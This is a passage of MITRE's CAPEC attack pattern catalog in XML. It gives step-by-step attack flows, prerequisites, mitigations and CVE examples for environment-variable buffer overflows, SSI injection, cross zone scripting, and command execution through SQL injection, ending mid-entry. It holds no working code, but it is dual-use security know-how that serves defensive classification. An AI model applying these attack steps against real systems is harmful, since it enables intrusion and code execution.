<ns0:Attack_Pattern_Catalog xmlns:html="http://www.w3.org/1999/xhtml" xmlns:ns0="http://capec.mitre.org/capec-3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="CAPEC" Version="3.9" Date="2023-01-24" xsi:schemaLocation="http://capec.mitre.org/capec-3 http://capec.mitre.org/data/xsd/ap_schema_v3.5.xsd">
   <ns0:Attack_Patterns>
      <ns0:Attack_Pattern ID="10" Name="Buffer Overflow via Environment Variables" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.</ns0:Description>
         <ns0:Extended_Description>Although the focus of this attack is putting excessive content into an environment variable that is loaded into a buffer, environment variables can be used to assist a classic buffer overflow attack as well. In the case where the buffer used in a traditional buffer overflow attack is not large enough to store the adversary's shell code, they will store the shell code in an environment variable and attempt to return to its address, rather than back into the data they wrote to the buffer.</ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack the adversary looks for an application that loads the content of an environment variable into a buffer.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.</ns0:Description>
               <ns0:Technique>Change the values of environment variables thought to be used by the application to contain excessive data. If the program is loading the value of the environment variable into a buffer, this could cause a crash and an attack vector will be found.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.</ns0:Description>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application uses environment variables.</ns0:Prerequisite>
            <ns0:Prerequisite>An environment variable exposed to the user is vulnerable to a buffer overflow.</ns0:Prerequisite>
            <ns0:Prerequisite>The vulnerable environment variable uses untrusted data.</ns0:Prerequisite>
            <ns0:Prerequisite>Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should trigger an alert.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Do not expose environment variable to the user.</ns0:Mitigation>
            <ns0:Mitigation>Do not use untrusted data in your environment variables.</ns0:Mitigation>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking</ns0:Mitigation>
            <ns0:Mitigation>There are tools such as Sharefuzz [REF-2] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable. See also: CVE-1999-0906</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>A buffer overflow in the rlogin program involves its consumption of the $TERM environmental variable. See also: CVE-1999-0046</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="302" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="99" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="733" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Buffer Overflow via Environment Variables</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
            <ns0:Reference External_Reference_ID="REF-2" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="101" Name="Server Side Include (SSI) Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="253" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="600" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine applicability] The adversary determines whether server side includes are enabled on the target web server.</ns0:Description>
               <ns0:Technique>Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.</ns0:Technique>
               <ns0:Technique>Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find Injection Point] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject SSI] Using the found injection point, the adversary sends arbitrary code to be inlcuded by the application on the server side. They may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the adversary.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>A web server that supports server side includes and has them enabled</ns0:Prerequisite>
            <ns0:Prerequisite>User controllable input that can carry include directives to the web server</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them</ns0:Mitigation>
            <ns0:Mitigation>All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive</ns0:Mitigation>
            <ns0:Mitigation>Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the "Options Includes" directive enabled.</html:p>
               <html:p>Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error.</html:p>
               <html:p>When these logs are eventually reviewed, the server parses the SSI directives and executes them.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="97" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>36</ns0:Entry_ID>
               <ns0:Entry_Name>SSI Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Server-Side Includes (SSI) Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-610" Section="Testing for SSI Injection" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="104" Name="Cross Zone Scripting" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from "Restful Privilege Escalation" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233">
               <ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.</ns0:Description>
               <ns0:Technique>Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.</ns0:Description>
               <ns0:Technique>Finding weaknesses in functionality used by both privileged and unprivileged users.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.</ns0:Description>
               <ns0:Technique>The attacker makes it as likely as possible that the vulnerable functionality into which they have injected the payload has a high likelihood of being used by the victim.</ns0:Technique>
               <ns0:Technique>Leverage cross-site scripting vulnerability to inject payload.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must be using a zone-aware browser.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Disable script execution.</ns0:Mitigation>
            <ns0:Mitigation>Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone</ns0:Mitigation>
            <ns0:Mitigation>Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone</ns0:Mitigation>
            <ns0:Mitigation>Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum</ns0:Mitigation>
            <ns0:Mitigation>Ensure proper HTML output encoding before writing user supplied data to the page</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the "add video to chat" feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. "Add video to chat" uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="250" />
            <ns0:Related_Weakness CWE_ID="638" />
            <ns0:Related_Weakness CWE_ID="285" />
            <ns0:Related_Weakness CWE_ID="116" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="108" Name="Command Line Execution through SQL Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The application does not properly validate data before storing in the database</ns0:Prerequisite>
            <ns0:Prerequisite>Backend application implicitly trusts the data stored in the database</ns0:Prerequisite>
            <ns0:Prerequisite>Malicious data is used on the backend as a command line argument</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Disable MSSQL xp_cmdshell directive on the database</ns0:Mitigation>
            <ns0:Mitigation>Properly validate the data (syntactically and semantically) before writing it to the database.</ns0:Mitigation>
            <ns0:Mitigation>Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799).</html:p>
               <html:p>Reference: https://www.cve.org/CVERecord?id=CVE-2006-6799</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="89" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="78" />
            <ns0:Related_Weakness CWE_ID="114" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
